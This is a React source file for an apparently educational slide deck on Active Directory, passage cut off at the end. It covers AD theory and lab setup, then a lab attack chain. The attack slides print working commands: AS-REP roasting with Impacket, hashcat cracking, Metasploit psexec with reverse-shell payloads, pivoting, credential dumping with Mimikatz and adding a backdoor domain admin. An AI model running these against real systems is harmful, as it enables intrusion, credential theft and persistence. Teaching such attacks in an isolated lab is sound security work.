"use client";

import { useState, useEffect, useCallback } from "react";

function CodeBlock({ code, lang = "bash" }: { code: string; lang?: string }) {
	const [copied, setCopied] = useState(false);
	return (
		<div className="code-block">
			<div className="code-header">
				<span className="code-lang">{lang}</span>
				<button
					className="copy-btn"
					onClick={() => {
						navigator.clipboard.writeText(code);
						setCopied(true);
						setTimeout(() => setCopied(false), 2000);
					}}
				>
					{copied ? "✓ copied" : "copy"}
				</button>
			</div>
			<pre className="code-pre">
				<code>{code}</code>
			</pre>
		</div>
	);
}

function StepList({
	steps,
}: {
	steps: { n: number; title: string; desc: string }[];
}) {
	return (
		<div className="step-list">
			{steps.map((s) => (
				<div key={s.n} className="step-item">
					<div className="step-num">{String(s.n).padStart(2, "0")}</div>
					<div className="step-body">
						<div className="step-title">{s.title}</div>
						<div className="step-desc">{s.desc}</div>
					</div>
				</div>
			))}
		</div>
	);
}

function Pill({ label, color }: { label: string; color: string }) {
	return (
		<span className="pill" style={{ borderColor: color, color }}>
			{label}
		</span>
	);
}

function Alert({
	type,
	children,
}: {
	type: "warn" | "info" | "danger";
	children: React.ReactNode;
}) {
	const map = {
		warn: ["⚠", "#f59e0b"],
		info: ["ℹ", "#38bdf8"],
		danger: ["!", "#ef4444"],
	} as const;
	const [icon, color] = map[type];
	return (
		<div className="alert" style={{ borderColor: color }}>
			<span className="alert-icon" style={{ color }}>
				{icon}
			</span>
			<div className="alert-text" style={{ color }}>
				{children}
			</div>
		</div>
	);
}

function TwoCol({
	left,
	right,
}: {
	left: React.ReactNode;
	right: React.ReactNode;
}) {
	return (
		<div className="two-col">
			<div>{left}</div>
			<div>{right}</div>
		</div>
	);
}

function SH({
	children,
	color,
}: {
	children: React.ReactNode;
	color?: string;
}) {
	return (
		<h3
			className="section-header"
			style={color ? { color, borderColor: color } : {}}
		>
			{children}
		</h3>
	);
}

function BList({ items }: { items: string[] }) {
	return (
		<ul className="blist">
			{items.map((i, idx) => (
				<li key={idx}>
					<span className="blist-dot">▸</span> {i}
				</li>
			))}
		</ul>
	);
}

function HierarchyDiagram() {
	const levels = [
		{
			label: "Forest",
			icon: "🌲",
			color: "#a78bfa",
			desc: "Top-level security boundary",
			badge: "NTDS.dit schema",
		},
		{
			label: "Tree",
			icon: "🌳",
			color: "#38bdf8",
			desc: "Contiguous namespace + transitive trust",
			badge: "lab.local",
		},
		{
			label: "Domain",
			icon: "🏢",
			color: "#34d399",
			desc: "Administrative unit — DC stores & replicates",
			badge: "Domain Controller",
		},
		{
			label: "Organizational Unit",
			icon: "📂",
			color: "#f59e0b",
			desc: "GPO scope + delegated admin container",
			badge: "IT / HR / Finance",
		},
		{
			label: "Objects",
			icon: "👤",
			color: "#f87171",
			desc: "Users, Computers, Groups, Service Accounts",
			badge: "Leaf nodes",
		},
	];
	return (
		<div style={{ marginTop: "0.5rem" }}>
			{levels.map((lvl, i) => {
				const last = i === levels.length - 1;
				const nextColor = !last ? levels[i + 1].color : lvl.color;
				return (
					<div key={i} style={{ display: "flex", alignItems: "stretch" }}>
						<div
							style={{
								display: "flex",
								flexDirection: "column",
								alignItems: "center",
								width: 24,
								flexShrink: 0,
							}}
						>
							<div
								style={{
									width: 10,
									height: 10,
									borderRadius: "50%",
									flexShrink: 0,
									marginTop: 14,
									background: lvl.color + "20",
									border: `2px solid ${lvl.color}90`,
								}}
							/>
							{!last && (
								<div
									style={{
										flex: 1,
										width: 1.5,
										background: `linear-gradient(to bottom, ${lvl.color}50, ${nextColor}30)`,
									}}
								/>
							)}
						</div>
						<div
							style={{
								flex: 1,
								margin: "3px 0 3px 8px",
								borderRadius: 6,
								padding: "10px 14px",
								background: lvl.color + "0d",
								border: `1px solid ${lvl.color}35`,
								borderLeft: `3px solid ${lvl.color}cc`,
								display: "flex",
								alignItems: "center",
								gap: 12,
							}}
						>
							<span
								style={{ fontSize: "1.2rem", flexShrink: 0, lineHeight: 1 }}
							>
								{lvl.icon}
							</span>
							<div style={{ minWidth: 0 }}>
								<div
									style={{
										fontSize: "0.87rem",
										fontWeight: 700,
										color: lvl.color,
										letterSpacing: "0.01em",
									}}
								>
									{lvl.label}
								</div>
								<div
									style={{
										fontSize: "0.74rem",
										color: "#475569",
										marginTop: 2,
										fontFamily: "'JetBrains Mono', monospace",
									}}
								>
									{lvl.desc}
								</div>
							</div>
							<span
								style={{
									marginLeft: "auto",
									fontSize: "0.65rem",
									fontFamily: "'JetBrains Mono', monospace",
									padding: "2px 8px",
									borderRadius: 3,
									border: `1px solid ${lvl.color}40`,
									background: lvl.color + "10",
									color: lvl.color,
									whiteSpace: "nowrap",
									flexShrink: 0,
									opacity: 0.85,
								}}
							>
								{lvl.badge}
							</span>
						</div>
					</div>
				);
			})}
		</div>
	);
}

function ProtoCard({
	icon,
	name,
	color,
	rows,
}: {
	icon: string;
	name: string;
	color: string;
	rows: [string, string][];
}) {
	return (
		<div className="proto-card" style={{ borderColor: color + "50" }}>
			<div className="proto-head">
				<span className="proto-icon">{icon}</span>
				<span className="proto-name" style={{ color }}>
					{name}
				</span>
			</div>
			{rows.map(([k, v]) => (
				<div key={k} className="term-row">
					<span className="term" style={{ color }}>
						{k}
					</span>
					<span className="term-def">{v}</span>
				</div>
			))}
		</div>
	);
}

function AttackFlowDiagram() {
	const nodes = [
		{
			label: "Arch Linux",
			sub: "192.168.56.1",
			icon: "🐧",
			color: "#f87171",
			role: "Attacker",
		},
		{
			label: "Windows Server 2025",
			sub: "192.168.56.105",
			icon: "🖥",
			color: "#38bdf8",
			role: "DC · Pivot Node",
		},
		{
			label: "Windows 10",
			sub: "192.168.56.20",
			icon: "💻",
			color: "#34d399",
			role: "Final Target",
		},
	];
	const arrows = [
		{ label: "① AS-REP Roast → PSExec", color: "#f87171" },
		{ label: "② PSExec via DC pivot", color: "#f59e0b" },
	];
	return (
		<div
			style={{
				display: "flex",
				alignItems: "center",
				gap: 0,
				margin: "1.5rem 0",
				justifyContent: "center",
				flexWrap: "wrap",
			}}
		>
			{nodes.map((n, i) => (
				<div key={i} style={{ display: "flex", alignItems: "center" }}>
					<div
						style={{
							background: n.color + "10",
							border: `1px solid ${n.color}50`,
							borderLeft: `3px solid ${n.color}`,
							borderRadius: 7,
							padding: "1rem 1.3rem",
							minWidth: 160,
							textAlign: "center",
						}}
					>
						<div style={{ fontSize: "1.8rem", marginBottom: 6 }}>{n.icon}</div>
						<div
							style={{ fontSize: "0.92rem", fontWeight: 700, color: n.color }}
						>
							{n.label}
						</div>
						<div
							style={{
								fontSize: "0.78rem",
								color: "#64748b",
								fontFamily: "'JetBrains Mono', monospace",
								margin: "4px 0",
							}}
						>
							{n.sub}
						</div>
						<div
							style={{
								fontSize: "0.68rem",
								color: n.color + "cc",
								border: `1px solid ${n.color}30`,
								borderRadius: 3,
								padding: "2px 8px",
								display: "inline-block",
								marginTop: 4,
							}}
						>
							{n.role}
						</div>
					</div>
					{i < nodes.length - 1 && (
						<div
							style={{
								display: "flex",
								flexDirection: "column",
								alignItems: "center",
								padding: "0 0.75rem",
								gap: 6,
							}}
						>
							<div
								style={{
									fontSize: "0.68rem",
									color: arrows[i].color,
									fontFamily: "'JetBrains Mono', monospace",
									whiteSpace: "nowrap",
									textAlign: "center",
									maxWidth: 130,
								}}
							>
								{arrows[i].label}
							</div>
							<div style={{ fontSize: "1.3rem", color: arrows[i].color }}>
								→
							</div>
						</div>
					)}
				</div>
			))}
		</div>
	);
}

const slides = [
	{
		id: 0,
		title: "Agenda",
		subtitle: "What we'll cover today",
		tag: "Overview",
		tagColor: "#38bdf8",
		content: (
			<div className="agenda-grid">
				{[
					{ n: "01", label: "Active Directory Overview", color: "#38bdf8" },
					{ n: "02", label: "What is AD DS?", color: "#38bdf8" },
					{ n: "03", label: "Core Components & Hierarchy", color: "#38bdf8" },
					{
						n: "04",
						label: "Protocols LDAP · Kerberos · DNS",
						color: "#38bdf8",
					},
					{ n: "05", label: "Real-World Enterprise Use", color: "#38bdf8" },
					{ n: "06", label: "Lab Environment Setup", color: "#34d399" },
					{ n: "07", label: "Install & Configure AD DS", color: "#34d399" },
					{ n: "08", label: "Promote to Domain Controller", color: "#34d399" },
					{
						n: "09",
						label: "Populate AD — Users, Groups, OUs",
						color: "#34d399",
					},
					{
						n: "10",
						label: "AS-REP Roasting — The Misconfiguration",
						color: "#f87171",
					},
					{ n: "11", label: "Attacker Setup — Arch Linux", color: "#f87171" },
					{ n: "12", label: "Step 1 — Compromise the DC", color: "#f87171" },
					{ n: "13", label: "Step 2 — Pivot & Hit Win10", color: "#f87171" },
					{
						n: "14",
						label: "Post-Exploitation & Credential Dump",
						color: "#f87171",
					},
					{ n: "15", label: "Defence & Mitigation", color: "#a78bfa" },
					{ n: "16", label: "Summary", color: "#f59e0b" },
				].map((item) => (
					<div
						key={item.n}
						className="agenda-item"
						style={{ borderColor: item.color + "40" }}
					>
						<span className="agenda-n" style={{ color: item.color }}>
							{item.n}
						</span>
						<span className="agenda-label">{item.label}</span>
					</div>
				))}
			</div>
		),
	},
	{
		id: 1,
		title: "Active Directory",
		subtitle: "Overview & Why It Matters",
		tag: "Theory",
		tagColor: "#38bdf8",
		content: (
			<TwoCol
				left={
					<>
						<SH>What is Active Directory?</SH>
						<p className="body-text">
							Active Directory (AD) is Microsoft&apos;s centralized{" "}
							<strong>directory service</strong> for managing users, computers,
							and resources on a network. Introduced with{" "}
							<strong>Windows Server 2000</strong>, it has been the backbone of
							enterprise Windows networks ever since.
						</p>
						<p className="body-text" style={{ marginTop: "0.85rem" }}>
							It acts as a <strong>central hub</strong> for authentication and
							authorization — every login, every file share, every printer
							access goes through AD.
						</p>
					</>
				}
				right={
					<>
						<SH>Five core facts</SH>
						{[
							["Introduced", "Windows Server 2000"],
							["Protocol", "LDAP for directory access"],
							["Auth", "Kerberos (default) + NTLM"],
							["Name resolution", "DNS — maps names to IPs"],
						].map(([k, v]) => (
							<div key={k} className="term-row">
								<span className="term">{k}</span>
								<span className="term-def">{v}</span>
							</div>
						))}
						<Alert type="info">
							AD is present in ~90% of Fortune 500 companies — making it the
							single most targeted service in enterprise security.
						</Alert>
					</>
				}
			/>
		),
	},
	{
		id: 2,
		title: "What is AD DS?",
		subtitle: "Active Directory Domain Services — the engine behind AD",
		tag: "Theory",
		tagColor: "#38bdf8",
		content: (
			<TwoCol
				left={
					<>
						<SH>What is a Directory?</SH>
						<p className="body-text">
							A <strong>directory</strong> is a hierarchical structure that
							stores information about objects on a network — users, computers,
							printers, groups — and organizes them so they are easy to manage
							and locate.
						</p>
						<SH>What does AD DS do?</SH>
						<p className="body-text">
							<strong>Active Directory Domain Services (AD DS)</strong> provides
							the methods for storing directory data and making it available to
							users and administrators. It stores usernames, passwords, and
							contact details, and controls who can read or write that data.
						</p>
					</>
				}
				right={
					<>
						<SH>AD DS vs AD — what&apos;s the difference?</SH>
						{[
							["AD", "Umbrella brand for all Microsoft directory services"],
							["AD DS", "The core role — stores & manages domain objects"],
							["AD LDS", "Lightweight version for app-specific directories"],
							["AD CS", "Certificate Services — issues PKI certificates"],
							["AD FS", "Federation Services — SSO with external partners"],
							["AD RMS", "Rights Management — controls document access"],
						].map(([k, v]) => (
							<div key={k} className="term-row">
								<span className="term">{k}</span>
								<span className="term-def">{v}</span>
							</div>
						))}
					</>
				}
			/>
		),
	},
	{
		id: 3,
		title: "Core Components & Hierarchy",
		subtitle: "How AD organizes everything",
		tag: "Theory",
		tagColor: "#38bdf8",
		content: (
			<TwoCol
				left={
					<>
						<SH>Logical structure</SH>
						<HierarchyDiagram />
					</>
				}
				right={
					<>
						<SH>Each level explained</SH>
						{[
							[
								"🌲 Forest",
								"The security boundary. All domains share one schema and Global Catalog. Different forests do NOT automatically trust each other.",
							],
							[
								"🌳 Tree",
								"One or more domains connected by automatic two-way transitive trusts, sharing a contiguous namespace (e.g. lab.local → dev.lab.local).",
							],
							[
								"🏢 Domain",
								"The administrative unit. A domain controller (DC) stores and replicates the domain database (NTDS.dit).",
							],
							[
								"📂 OU",
								"Organizational Unit — a container inside a domain used to delegate admin rights and apply Group Policy.",
							],
							[
								"👤 Objects",
								"Leaf objects: Users, Computers, Groups, Printers, Service Accounts. Every object has attributes defined by the schema.",
							],
						].map(([k, v]) => (
							<div key={k} style={{ marginBottom: "0.95rem" }}>
								<div
									style={{
										fontSize: "0.95rem",
										color: "#e2e8f0",
										fontWeight: 700,
										marginBottom: "4px",
									}}
								>
									{k}
								</div>
								<div
									style={{
										fontSize: "0.88rem",
										color: "#64748b",
										lineHeight: 1.65,
									}}
								>
									{v}
								</div>
							</div>
						))}
					</>
				}
			/>
		),
	},
	{
		id: 4,
		title: "Protocols & Standards",
		subtitle: "The technical foundation of AD",
		tag: "Theory",
		tagColor: "#38bdf8",
		content: (
			<>
				<div className="proto-grid">
					<ProtoCard
						icon="📒"
						name="LDAP"
						color="#38bdf8"
						rows={[
							["Full name", "Lightweight Directory Access Protocol"],
							["Port", "389 / 636 (LDAPS — over TLS)"],
							[
								"Role",
								"Read & write directory objects — the query language of AD",
							],
							[
								"Security",
								"Plain LDAP is unencrypted; LDAPS adds TLS encryption",
							],
						]}
					/>
					<ProtoCard
						icon="🎟"
						name="Kerberos"
						color="#a78bfa"
						rows={[
							["Version", "Kerberos v5 default auth since Win 2000"],
							["Port", "88 (TCP/UDP)"],
							["Role", "Ticket-based auth — no password sent over the wire"],
							[
								"Key Risk",
								"AS-REP Roasting — request hashes without pre-auth and crack offline",
							],
						]}
					/>
					<ProtoCard
						icon="🌐"
						name="DNS"
						color="#34d399"
						rows={[
							["Port", "53 (TCP/UDP)"],
							["Role", "Clients use DNS to locate domain controllers"],
							["Without DNS", "Clients cannot join the domain or log in"],
						]}
					/>
					<ProtoCard
						icon="🔐"
						name="NTLM"
						color="#f59e0b"
						rows={[
							["Type", "Challenge-response hash auth (legacy)"],
							["Port", "445 (SMB) / 135 (RPC)"],
							[
								"Key Risk",
								"Pass-the-Hash — capture hash and replay it directly",
							],
							[
								"Status",
								"Disabled by default in Server 2025; avoid on modern AD",
							],
						]}
					/>
				</div>
			</>
		),
	},
	{
		id: 5,
		title: "Real-World Enterprise Use",
		subtitle: "What AD DS powers in production",
		tag: "Theory",
		tagColor: "#38bdf8",
		content: (
			<TwoCol
				left={
					<>
						<SH>What AD manages in a real company</SH>
						<BList
							items={[
								"Single Sign-On (SSO) — log in once, access everything",
								"Centralised user provisioning and deprovisioning",
								"Group Policy — enforce password rules, screen locks, software",
								"Software deployment — push installers across the domain",
								"File share permissions — mapped drives via GPO",
								"VPN & Wi-Fi authentication via RADIUS + AD",
								"Email (Exchange / M365) — mailboxes tied to AD accounts",
								"Certificate Authority (AD CS) — TLS certs for internal services",
							]}
						/>
						<SH>Typical AD roles in an org</SH>
						{[
							[
								"Domain Admin",
								"Full control over the domain — the highest privilege",
							],
							[
								"Enterprise Admin",
								"Forest-wide admin — highest possible privilege",
							],
							[
								"Service Account",
								"Non-interactive account used by apps/services",
							],
							[
								"Regular User",
								"Standard domain user — least-privilege baseline",
							],
						].map(([k, v]) => (
							<div key={k} className="term-row">
								<span className="term" style={{ minWidth: 140 }}>
									{k}
								</span>
								<span className="term-def">{v}</span>
							</div>
						))}
					</>
				}
				right={
					<>
						<SH>Why AD is the #1 attack target</SH>
						<p className="body-text">
							Compromising a single Domain Controller gives an attacker access
							to <strong>every resource in the domain</strong> — all user
							credentials, all file shares, all servers, all workstations.
						</p>
					</>
				}
			/>
		),
	},
	{
		id: 6,
		title: "Lab Environment",
		subtitle: "What you need before the practical demo",
		tag: "Part 1 · Setup",
		tagColor: "#34d399",
		content: (
			<>
				<Alert type="warn">
					All VMs must be on a Host-Only / Internal network.
				</Alert>
				<AttackFlowDiagram />
				<div className="lab-grid">
					{[
						{
							name: "Windows Server 2025",
							role: "Domain Controller · Pivot Node",
							color: "#38bdf8",
							specs: [
								"IP: 192.168.56.105 (static)",
								"RAM: 4 GB min — Disk: 60 GB",
								"AD DS installed + lab.local forest",
								"Windows Defender disabled for demo",
								"Acts as pivot between Arch and Win10",
							],
						},
						{
							name: "Windows 10",
							role: "Final Target Machine",
							color: "#f87171",
							specs: [
								"IP: 192.168.56.20 (static)",
								"RAM: 2 GB",
								"Joined to lab.local domain",
								"Local Administrator account enabled",
								"Final target of the attack chain",
							],
						},
						{
							name: "Arch Linux",
							role: "Attacker Machine",
							color: "#a78bfa",
							specs: [
								"IP: 192.168.56.1 (host-only)",
								"Metasploit + Impacket installed",
								"AS-REP Roasts the DC first",
								"Pivots through DC to reach Win10",
							],
						},
					].map((vm) => (
						<div
							key={vm.name}
							className="vm-card"
							style={{ borderColor: vm.color + "60" }}
						>
							<div className="vm-header" style={{ color: vm.color }}>
								<span className="vm-dot" style={{ background: vm.color }} />
								{vm.name}
							</div>
							<div className="vm-role">{vm.role}</div>
							<BList items={vm.specs} />
						</div>
					))}
				</div>
				<SH>Hypervisor</SH>
				<div className="hv-row">
					<Pill label="VirtualBox" color="#34d399" />
				</div>
			</>
		),
	},
	{
		id: 7,
		title: "Install AD DS",
		subtitle: "Part 1 — Windows Server role installation",
		tag: "Part 1 · Setup",
		tagColor: "#34d399",
		content: (
			<TwoCol
				left={
					<>
						<SH>Step-by-step via SConfig (Server Core)</SH>
						<StepList
							steps={[
								{
									n: 1,
									title: "Set static IP",
									desc: "SConfig → option 8 → select adapter index → set static: 192.168.56.105 / 255.255.255.0, DNS: 127.0.0.1",
								},
								{
									n: 2,
									title: "Rename the server",
									desc: "SConfig → option 2 → rename to DC01, reboot",
								},
								{
									n: 3,
									title: "Exit to PowerShell",
									desc: "SConfig → option 15 → opens PowerShell prompt",
								},
								{
									n: 4,
									title: "Install AD DS role",
									desc: "Run Install-WindowsFeature command (see right panel)",
								},
								{
									n: 5,
									title: "Promote to DC",
									desc: "Run Install-ADDSForest command — server reboots automatically",
								},
							]}
						/>
					</>
				}
				right={
					<>
						<SH>PowerShell commands (Server Core)</SH>
						<CodeBlock
							lang="powershell"
							code={`# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services \`
  -IncludeManagementTools

# Verify installation
Get-WindowsFeature AD-Domain-Services`}
						/>
						<Alert type="info">
							Windows Server 2025 installs as Server Core by default — no GUI.
							All configuration is done via SConfig menu or PowerShell.
						</Alert>
						<SH>What gets installed</SH>
						<BList
							items={[
								"AD DS binaries and management tools",
								"Active Directory Users and Computers (ADUC)",
								"Group Policy Management Console (GPMC)",
								"DNS Server role (added automatically)",
							]}
						/>
					</>
				}
			/>
		),
	},
	{
		id: 8,
		title: "Promote to Domain Controller",
		subtitle: "Part 1 — Creating the domain",
		tag: "Part 1 · Setup",
		tagColor: "#34d399",
		content: (
			<TwoCol
				left={
					<>
						<SH>PowerShell — one command</SH>
						<CodeBlock
							lang="powershell"
							code={`Install-ADDSForest \`
  -DomainName "lab.local" \`
  -DomainNetbiosName "LAB" \`
  -InstallDns \`
  -SafeModeAdministratorPassword \`
    (ConvertTo-SecureString "Admin123" \`
     -AsPlainText -Force) \`
  -Force`}
						/>
					</>
				}
				right={
					<>
						<SH>What happens during promotion</SH>
						<StepList
							steps={[
								{
									n: 1,
									title: "NTDS.dit created",
									desc: "The AD database file is initialized at C:\\Windows\\NTDS\\",
								},
								{
									n: 2,
									title: "DNS zone created",
									desc: "lab.local forward lookup zone is created automatically",
								},
								{
									n: 3,
									title: "SYSVOL initialized",
									desc: "Shared folder for GPOs and login scripts",
								},
								{
									n: 4,
									title: "Server reboots",
									desc: "Machine restarts and logs in as LAB\\Administrator",
								},
								{
									n: 5,
									title: "Verify",
									desc: "Run: Get-ADDomain — should return lab.local details",
								},
							]}
						/>
					</>
				}
			/>
		),
	},
	{
		id: 9,
		title: "Populate Active Directory",
		subtitle: "Part 1 — Users, Groups & OUs (including the misconfiguration)",
		tag: "Part 1 · Setup",
		tagColor: "#34d399",
		content: (
			<>
				<SH>Create OUs, Users and Groups via PowerShell</SH>
				<CodeBlock
					lang="powershell"
					code={`# ── Organizational Units ─────────────────────────────────
New-ADOrganizationalUnit -Name "IT" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "HR" -Path "DC=lab,DC=local"

# ── Regular Users ─────────────────────────────────────────
$pw = ConvertTo-SecureString "Password123!" -AsPlainText -Force
New-ADUser -Name "Alice Admin" -SamAccountName aaladin \`
  -AccountPassword $pw -Enabled $true -Path "OU=IT,DC=lab,DC=local"
New-ADUser -Name "Bob Smith" -SamAccountName bsmith \`
  -AccountPassword $pw -Enabled $true -Path "OU=HR,DC=lab,DC=local"

# ── Groups ────────────────────────────────────────────────
New-ADGroup -Name "IT-Admins" -GroupScope Global -Path "OU=IT,DC=lab,DC=local"
Add-ADGroupMember -Identity "Domain Admins" -Members aaladin`}
				/>

				<CodeBlock
					lang="powershell"
					code={`# Create service account with weak password
New-ADUser -Name "svc-backup" -SamAccountName "svc-backup" \`
  -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) \`
  -Enabled $true

# THE MISCONFIGURATION: disable Kerberos pre-authentication
# Anyone can now request a hash — no credentials needed
Set-ADAccountControl -Identity "svc-backup" -DoesNotRequirePreAuth $true

# Verify
Get-ADUser svc-backup -Properties DoesNotRequirePreAuth`}
				/>
				<Alert type="danger">
					This makes the account AS-REP Roastable — an unauthenticated attacker
					can request a Kerberos hash from the DC and crack it offline to obtain
					valid domain credentials.
				</Alert>
			</>
		),
	},
	{
		id: 10,
		title: "AS-REP Roasting",
		subtitle: "Part 2 — Exploiting the Kerberos misconfiguration",
		tag: "Part 2 · Attack",
		tagColor: "#f87171",
		content: (
			<TwoCol
				left={
					<>
						<SH>What is AS-REP Roasting?</SH>
						<p className="body-text">
							Kerberos normally requires a client to prove its identity before
							the DC hands out a ticket — this is called{" "}
							<strong>pre-authentication</strong>. When it is disabled on an
							account, anyone can ask the DC for a Kerberos AS-REP response{" "}
							<strong>without knowing the password</strong>.
						</p>
						<p className="body-text" style={{ marginTop: "0.85rem" }}>
							The AS-REP response contains a hash encrypted with the
							account&apos;s password. An attacker captures this hash and cracks
							it completely offline — no further interaction with the DC needed.
						</p>
					</>
				}
				right={
					<>
						<SH>Technical Details</SH>
						{[
							["Protocol", "Kerberos v5 — port 88"],
							["Trigger", "DoesNotRequirePreAuth = True on account"],
							["Hash type", "krb5asrep — hashcat mode 18200"],
							["Tool", "Impacket GetNPUsers"],
							["Crack tool", "hashcat + rockyou.txt wordlist"],
							["CVE", "Not a CVE — pure misconfiguration"],
						].map(([k, v]) => (
							<div key={k} className="term-row">
								<span className="term">{k}</span>
								<span className="term-def">{v}</span>
							</div>
						))}
					</>
				}
			/>
		),
	},
	{
		id: 11,
		title: "Attacker Setup",
		subtitle: "Part 2 — Arch Linux, Impacket & Metasploit",
		tag: "Part 2 · Attack",
		tagColor: "#f87171",
		content: (
			<TwoCol
				left={
					<>
						<SH>1. Install Tools on Arch Linux</SH>
						<CodeBlock
							lang="bash"
							code={`# Install Metasploit and nmap
sudo pacman -S metasploit nmap

# Install Impacket for AS-REP Roasting
sudo pacman -S impacket
# or via pip
pip install impacket --break-system-packages`}
						/>
						<SH>2. Verify Connectivity</SH>
						<CodeBlock
							lang="bash"
							code={`# Confirm both VMs are reachable
ping 192.168.56.105    # DC
ping 192.168.56.20     # Win10

# Scan SMB on both
nmap -p 445 192.168.56.105 192.168.56.20`}
						/>
					</>
				}
				right={
					<>
						<SH>3. Prepare Win10 for the Demo</SH>
						<CodeBlock
							lang="powershell"
							code={`# On Windows 10 VM — run as Administrator

# Enable the local Administrator account
net user Administrator /active:yes
net user Administrator Admin123

# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable firewall completely
netsh advfirewall set allprofiles state off`}
						/>
					</>
				}
			/>
		),
	},
	{
		id: 12,
		title: "Step 1 — Compromise the DC",
		subtitle: "Part 2 — AS-REP Roast → crack hash → PSExec → SYSTEM on DC",
		tag: "Part 2 · Attack",
		tagColor: "#f87171",
		content: (
			<>
				<TwoCol
					left={
						<>
							<SH>Phase A — AS-REP Roast (no password needed)</SH>
							<CodeBlock
								lang="bash"
								code={`# Create target users file
echo "svc-backup" > /tmp/users.txt

# Request Kerberos hash from DC — no creds needed!
impacket-GetNPUsers lab.local/ \\
  -usersfile /tmp/users.txt \\
  -no-pass \\
  -dc-ip 192.168.56.105 \\
  -outputfile /tmp/hash.txt

# Output — DC hands us the hash:
# $krb5asrep$23$svc-backup@LAB.LOCAL:a3f9...`}
							/>
							<SH>Phase B — Crack the hash offline</SH>
							<CodeBlock
								lang="bash"
								code={`hashcat -m 18200 /tmp/hash.txt \\
  /usr/share/wordlists/rockyou.txt

# Result:
# svc-backup : Password123`}
							/>
						</>
					}
					right={
						<>
							<SH>Phase C — PSExec into DC with known creds</SH>
							<CodeBlock
								lang="bash"
								code={`msfconsole

use exploit/windows/smb/psexec
set RHOSTS 192.168.56.105    # DC
set SMBUser Administrator
set SMBPass Admin123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
run

# ✓ Meterpreter session 1 opened on DC
meterpreter > getuid
# NT AUTHORITY\\SYSTEM`}
							/>
							<Alert type="danger">
								We now have SYSTEM-level access on the Domain Controller. Every
								account and every machine in lab.local is compromised from this
								point.
							</Alert>
						</>
					}
				/>
			</>
		),
	},
	{
		id: 13,
		title: "Step 2 — Pivot & Hit Win10",
		subtitle: "Part 2 — Route traffic through DC → PSExec Win10",
		tag: "Part 2 · Attack",
		tagColor: "#f87171",
		content: (
			<>
				<SH>Full attack chain — DC session active, now targeting Win10</SH>
				<CodeBlock
					lang="bash"
					code={`# ── Session 1 on DC is active ───────────────────────────────
meterpreter > getuid
# NT AUTHORITY\\SYSTEM on DC01

# ── Background the DC session ───────────────────────────────
meterpreter > background
# [*] Backgrounding session 1...

# ── Route all traffic through the DC pivot ──────────────────
msf > route add 192.168.56.0/24 1
# [*] Route added — all traffic to 192.168.56.x goes via DC

# ── PSExec into Win10 through the DC pivot ──────────────────
msf > use exploit/windows/smb/psexec
msf > set RHOSTS 192.168.56.20       # Windows 10 target
msf > set SMBUser Administrator
msf > set SMBPass Admin123
msf > set SMBDomain .                # use local account
msf > set LHOST 192.168.56.1
msf > set LPORT 4445
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > run

# ✓ Meterpreter session 2 opened on Win10
# Win10 sees traffic coming FROM the DC — not from Arch`}
				/>
				<Alert type="danger">
					Win10 sees the connection originating from the DC (192.168.56.105) not
					from Arch Linux.
				</Alert>
				<SH>Verify both sessions</SH>
				<CodeBlock
					lang="text"
					code={`msf > sessions -l
  Id  Type                  Info                         Connection
  --  ----                  ----                         ----------
   1  meterpreter x64/win  NT AUTHORITY\\SYSTEM @ DC01  192.168.56.1:4444 → DC
   2  meterpreter x64/win  NT AUTHORITY\\SYSTEM @ WIN10 192.168.56.1:4445 → Win10 via DC`}
				/>
			</>
		),
	},
	{
		id: 14,
		title: "Post-Exploitation",
		subtitle: "Part 2 — What an attacker does with SYSTEM access",
		tag: "Part 2 · Attack",
		tagColor: "#f87171",
		content: (
			<TwoCol
				left={
					<>
						<SH>Inside Win10 — Session 2</SH>
						<CodeBlock
							lang="bash"
							code={`# Switch to Win10 session
sessions -i 2

# Confirm identity and machine
getuid
# NT AUTHORITY\\SYSTEM
sysinfo

# Dump local password hashes
hashdump
# Administrator:500:aad3b...LM:NTLM:::

# Migrate to stable process
migrate -N explorer.exe`}
						/>
					</>
				}
				right={
					<>
						<SH>Back on the DC — Session 1</SH>
						<CodeBlock
							lang="bash"
							code={`# Switch back to DC session
sessions -i 1

# Load Mimikatz (Kiwi module)
load kiwi

# Dump ALL domain credentials
creds_all

# Create a backdoor domain admin
shell
net user backdoor P@ss123 /add /domain
net group "Domain Admins" backdoor /add /domain`}
						/>
						<SH>Domain-wide Impact</SH>
						<BList
							items={[
								"All domain user hashes extracted",
								"Pass-the-Hash to log in as any user — no cracking",
								"Backdoor domain admin account persists after reboot",
								"Full lateral movement to every machine in lab.local",
								"Ransomware deployment or data exfiltration possible",
							]}
						/>
					</>
				}
			/>
		),
	},

	{
		id: 15,
		title: "Summary",
		subtitle: "Key takeaways",
		tag: "Conclusion",
		tagColor: "#f59e0b",
		content: (
			<div className="summary-wrap">
				<div className="summary-cols three">
					<div className="summary-col">
						<div className="summary-col-title" style={{ color: "#38bdf8" }}>
							📚 Theory
						</div>
						<BList
							items={[
								"AD DS — central directory for identity",
								"Forest → Domain → OU hierarchy",
								"LDAP, Kerberos, DNS, NTLM protocols",
								"Domains in ~90% of enterprises",
							]}
						/>
					</div>
					<div className="summary-col">
						<div className="summary-col-title" style={{ color: "#34d399" }}>
							🖥 We Built
						</div>
						<BList
							items={[
								"Windows Server 2025 DC (Server Core)",
								"AD DS with lab.local forest",
								"Users, Groups & OUs",
								"AS-REP roastable svc-backup account",
								"Win10 joined to the domain",
							]}
						/>
					</div>
					<div className="summary-col">
						<div className="summary-col-title" style={{ color: "#f87171" }}>
							⚡ We Attacked
						</div>
						<BList
							items={[
								"AS-REP Roasted svc-backup — no creds needed",
								"Cracked Kerberos hash → Password123",
								"PSExec into DC → SYSTEM (session 1)",
								"Set pivot route through DC (route add)",
								"PSExec into Win10 via DC → SYSTEM (session 2)",
								"Dumped all credentials with Kiwi/Mimikatz",
							]}
						/>
					</div>
				</div>
			</div>
		),
	},
];

function ProgressBar({ current, total }: { current: number; total: number }) {
	return (
		<div className="progress-track">
			<div
				className="progress-fill"
				style={{ width: `${((current + 1) / total) * 100}%` }}
			/>
		</div>
	);
}

function Landing({ onStart }: { onStart: () => void }) {
	const [typed, setTyped] = useState("");
	const target = "Active Directory Domain Services";
	useEffect(() => {
		let i = 0;
		const iv = setInterval(() => {
			if (i <= target.length) {
